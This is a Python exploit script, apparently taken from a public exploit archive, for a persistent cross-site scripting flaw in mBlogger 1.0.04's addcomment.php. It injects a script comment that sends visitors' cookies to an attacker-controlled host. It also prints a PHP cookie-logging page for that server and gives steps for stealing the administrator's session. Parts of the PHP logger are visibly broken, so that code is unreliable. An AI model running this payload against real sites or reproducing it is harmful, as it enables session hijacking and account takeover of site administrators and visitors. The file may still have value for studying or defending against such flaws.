mBlogger 1.0.04 (addcomment.php) Persistent XSS Exploit
=======================================================

#!/usr/bin/python
#
# Exploit Title:   mBlogger v1.0.04 (addcomment.php) Persistent XSS Exploit
# Date         :   04 September 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/mblogger/
# Version      :   1.0.04
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + addcomment.php => An SQL Injection at line 32 allows to insert javascript
#                     that will be executed from the client&#039;s browser when he
#                     visits the page viewpost.php?postID=<number>.
#
# 29: $commentAuthor = $_POST[&#039;commentAuthor&#039;];
# 30: $commentText = $_POST[&#039;commentText&#039;];
# 31: $postID = $_GET[&#039;postID&#039;];
# 32: $query = "INSERT INTO comments (user, comment, postid) VALUES
#     (&#039;$commentAuthor&#039;, &#039;$commentText&#039;, &#039;$postID&#039;)";
# 33: if(!mysql_query($query, $connection))
# 34: {
# 35:    die("Error updating post: " . mysql_error());
# 36: }
#
 
import sys
import http.client
import urllib.parse
 
 
def fatal(message):
    print(message)
    exit(1)
 
 
def usage(program):
    print(&#039;Usage  : &#039;+ program +&#039; <victim> <mBlogger path> <attacker>\n&#039;)
    print(&#039;Example: &#039;+ program +&#039; localhost /mBlogger/ localhost&#039;)
    print(&#039;         &#039;+ program +&#039; www.victim.com /path/ www.attacker.com&#039;)
    return
     
     
def getRemotePHPCode():
    source  = &#039;<?php\n&#039;
    source += &#039;$cs = explode("; ", $_GET[\&#039;c\&#039;]);\n&#039;
    source += &#039;$fp = fopen(\&#039;data.txt\&#039;,\&#039;a\&#039;);\n&#039;
    source += &#039;if(!empty($cs))\n&#039;
    source += &#039; foreach($cs as $k => $v) {\n&#039;
    source += &#039;   fwrite($fp,urldecode($r[1])."=".urldecode($r[2])."\\r\\n");\n&#039;
    source += &#039;  else fwrite($fp, "cannot decode $v");\n&#039;
    source += &#039; }\n&#039;
    source += &#039;fclose($fp);\n&#039;
    source += &#039;?>&#039;
    return source
 
 
def injectJavascript(victim, path, attacker):
    payload  = &#039;<script>\nd=new Image;\nd.src=\"http://&#039; + attacker
    payload += &#039;/c.php?c=\"+escape(document.cookie);\n</script>\n&#039;
 
    headers = {&#039;Content-type&#039;:&#039;application/x-www-form-urlencoded&#039;,&#039;Accept&#039;:&#039;text/plain&#039;}
    params  = urllib.parse.urlencode({&#039;commentAuthor&#039;:&#039;admin&#039;,&#039;commentText&#039;:payload,&#039;submitcomment&#039;:&#039;Submit&#039;})
    con     = http.client.HTTPConnection(victim)
 
    con.request(&#039;POST&#039;, path + &#039;addcomment.php?postID=1&#039;, params, headers)
    res = con.getresponse()
    if res.status != 200:
        return False
 
    con.close()
    return True
 
 
def exploit(victim, path, attacker):
    print(&#039;[+] Injecting Javascript&#039;)
    success = injectJavascript(victim, path, attacker)
    if not success:
        fatal(&#039;[!] Injection failed&#039;)
         
    print(&#039;[+] Generating PHP code for malicious site\n&#039;)
    print(getRemotePHPCode() + &#039;\n&#039;)
     
    print(&#039;[?] Instruction to use this exploit:&#039;)
    print(&#039;    2. Wait that the administrator visits &#039;)
    print(&#039;       http://&#039;+ victim +&#039;/&#039;+ path +&#039;viewpost.php?postID=1&#039;)
    print(&#039;    3. Read stolen cookies from http://&#039;+ attacker +&#039;/&#039; + &#039;data.txt&#039;)
    return
 
 
 
print(&#039;\n+-----------------------------------------------------------------------------+&#039;)
print(&#039;| mBlogger v1.0.04 (addcomment.php) Persistent XSS Exploit by Ptrace Security |&#039;)
print(&#039;+-----------------------------------------------------------------------------+\n&#039;)
 
if len(sys.argv) != 4:
   usage(sys.argv[0])
else:
   exploit(sys.argv[1],sys.argv[2], sys.argv[3]) 



